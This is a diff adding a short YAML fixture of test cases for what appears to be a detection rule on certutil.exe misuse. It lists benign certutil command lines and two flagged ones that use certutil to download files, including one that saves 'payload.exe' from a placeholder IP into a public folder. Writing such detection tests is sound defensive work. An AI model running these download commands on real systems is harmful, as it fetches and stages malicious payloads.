@@ -1,0 +1,10 @@
+positive:
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil.exe -urlcache -split -f http://203.0.113.5/payload.exe C:\Users\Public\p.exe'
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil -verifyctl -f -split https://example.test/a.bin'
+negative:
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil.exe -hashfile C:\Users\dan\file.txt SHA256'
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil -store my'
